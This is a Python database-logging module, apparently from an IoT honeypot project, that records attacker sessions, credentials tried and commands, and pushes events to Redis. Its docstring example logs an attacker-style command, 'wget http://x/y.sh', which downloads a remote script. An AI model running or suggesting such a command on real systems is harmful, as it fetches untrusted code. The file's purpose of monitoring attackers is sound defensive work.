"""
HoneyBot-IoT — shared PostgreSQL helper + unified event logging.

Every honeypot writes ONLY through this module:

    from common.db import Session
    s = Session("SSH", "smartlock", ip, src_port, dst_port=2222)
    s.auth("root", "1234", success=False)
    s.command("wget http://x/y.sh", output="...")
    s.close()

Writes are pushed onto an in-process queue and flushed by one background
writer thread, so a slow database never blocks an attacker connection and
rows are always written in order (session row before its events).
Each event is also published on Redis channel `honeybot:events` so the
dashboard / alerting can react in real time.
"""

import os
import json
import time
import uuid
import queue
import logging
import threading
from datetime import datetime, timezone

import psycopg2
import psycopg2.pool
import psycopg2.extras

log = logging.getLogger("db")

DB_URL = os.environ.get("DATABASE_URL", "postgresql://honeybot:honeybot@db:5432/honeybot")

_pool = None
_pool_lock = threading.Lock()


# ── Connection pool / simple query helpers (used by API + intel engine) ─────

def get_pool():
    global _pool
    with _pool_lock:
        if _pool is None:
            for attempt in range(30):
                try:
                    _pool = psycopg2.pool.ThreadedConnectionPool(1, 10, dsn=DB_URL)
                    log.info("DB pool connected.")
                    break
                except Exception as e:  # pragma: no cover - startup race
                    log.warning("DB not ready (%d/30): %s", attempt + 1, e)
                    time.sleep(2)
            else:
                raise RuntimeError("Could not connect to PostgreSQL")
    return _pool


def execute(query, params=(), fetch=False):
    pool = get_pool()
    conn = pool.getconn()
    try:
        with conn.cursor() as cur:
            cur.execute(query, params)
            rows = cur.fetchall() if fetch else None
        conn.commit()
        return rows if fetch else None
    except Exception as e:
        conn.rollback()
        log.error("DB error: %s | %s", e, query.strip().splitlines()[0][:80])
        return [] if fetch else None
    finally:
        pool.putconn(conn)


def fetchall(query, params=()):
    return execute(query, params, fetch=True) or []


def fetchdicts(query, params=()):
    pool = get_pool()
    conn = pool.getconn()
    try:
        with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
            cur.execute(query, params)
            rows = [dict(r) for r in cur.fetchall()]
        conn.commit()
        return rows
    except Exception as e:
        conn.rollback()
        log.error("DB error: %s", e)
        return []
    finally:
        pool.putconn(conn)


def scalar(query, params=(), default=0):
    rows = fetchall(query, params)
    return rows[0][0] if rows and rows[0][0] is not None else default


# ── Background writer ────────────────────────────────────────────────────────

_q: "queue.Queue" = queue.Queue(maxsize=100_000)
_writer_started = False
_writer_lock = threading.Lock()
_redis = None


def _get_redis():
    global _redis
    if _redis is None:
        try:
            from common.state import redis_client
            _redis = redis_client()
        except Exception:
            _redis = False
    return _redis or None


def _now():
    return datetime.now(timezone.utc)


def _writer():
    while True:
        item = _q.get()
        batch = [item]
        try:
            while len(batch) < 200:
                batch.append(_q.get_nowait())
        except queue.Empty:
            pass
        for _attempt in range(3):
            try:
                _flush(batch)
                break
            except Exception as e:  # DB down – retry, then drop
                log.error("writer flush failed: %s", e)
                time.sleep(1)


def _flush(batch):
    pool = get_pool()
    conn = pool.getconn()
    try:
        with conn.cursor() as cur:
            for kind, sql, params in batch:
                try:
                    cur.execute("SAVEPOINT sp")
                    cur.execute(sql, params)
                    cur.execute("RELEASE SAVEPOINT sp")
                except Exception as e:
                    cur.execute("ROLLBACK TO SAVEPOINT sp")
                    log.error("write %s failed: %s", kind, e)
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        pool.putconn(conn)


def _enqueue(kind, sql, params):
    global _writer_started
    if not _writer_started:
        with _writer_lock:
            if not _writer_started:
                threading.Thread(target=_writer, daemon=True, name="db-writer").start()
                _writer_started = True
    try:
        _q.put_nowait((kind, sql, params))
    except queue.Full:
        log.error("event queue full – dropping %s", kind)


def flush(timeout=5.0):
    """Block until the write queue is empty (used by tests / shutdown)."""
    end = time.time() + timeout
    while not _q.empty() and time.time() < end:
        time.sleep(0.05)
    time.sleep(0.1)


def _clip(v, n=4000):
    if v is None:
        return None
    v = str(v)
    return v if len(v) <= n else v[:n] + "…[truncated]"


# ── Public logging API ──────────────────────────────────────────────────────

def log_event(session, event_type, username=None, password=None, success=None,
              command=None, payload=None, **raw):
    """Write one event row for `session` (a Session object)."""
    ts = _now()
    raw_json = json.dumps(raw, default=str)
    _enqueue("event", """
        INSERT INTO events (ts, session_id, ip, src_port, device, protocol, event_type,
                            username, password, success, command, payload, raw)
        VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s::jsonb)
    """, (ts, session.id, session.ip, session.src_port, session.device, session.protocol,
          event_type, _clip(username, 256), _clip(password, 256), success,
          _clip(command), _clip(payload), raw_json))

    r = _get_redis()
    if r:
        try:
            r.publish("honeybot:events", json.dumps({
                "ts": ts.isoformat(), "session_id": session.id, "ip": session.ip,
                "device": session.device, "protocol": session.protocol,
                "event_type": event_type, "username": username,
                "success": success, "command": _clip(command, 200),
            }, default=str))
        except Exception:
            pass


class Session:
    """One attacker connection on one protocol/device."""

    def __init__(self, protocol, device, ip, src_port=None, dst_port=None,
                 client_version=None, log_connect=True, **meta):
        self.id = str(uuid.uuid4())
        self.protocol = protocol
        self.device = device
        self.ip = ip
        self.src_port = src_port
        self.dst_port = dst_port
        self.auth_attempts = 0
        self.login_success = False
        self.username = None
        self.commands = 0
        self.closed = False
        self.started = time.time()
        _enqueue("session", """
            INSERT INTO sessions (session_id, ip, src_port, dst_port, device, protocol,
                                  started_at, client_version, meta)
            VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s::jsonb)
        """, (self.id, ip, src_port, dst_port, device, protocol, _now(),
              client_version, json.dumps(meta, default=str)))
        if log_connect:
            self.event("connect", dst_port=dst_port)

    # convenience wrappers --------------------------------------------------
    def event(self, event_type, **kw):
        log_event(self, event_type, **kw)

    def auth(self, username, password, success, **kw):
        self.auth_attempts += 1
        if success:
            self.login_success = True
            self.username = username
        log_event(self, "auth", username=username, password=password, success=success, **kw)

    def command(self, cmd, output=None, **kw):
        self.commands += 1
        log_event(self, "command", username=self.username, command=cmd,
                  payload=_clip(output, 2000), **kw)

    def set_client_version(self, version):
        _enqueue("session_upd", "UPDATE sessions SET client_version=%s WHERE session_id=%s",
                 (_clip(version, 200), self.id))

    def close(self, reason="closed"):
        if self.closed:
            return
        self.closed = True
        self.event("disconnect", reason=reason, duration=round(time.time() - self.started, 3))
        _enqueue("session_close", """
            UPDATE sessions SET ended_at=%s, auth_attempts=%s, login_success=%s,
                   username=%s, commands=%s
            WHERE session_id=%s
        """, (_now(), self.auth_attempts, self.login_success, self.username,
              self.commands, self.id))
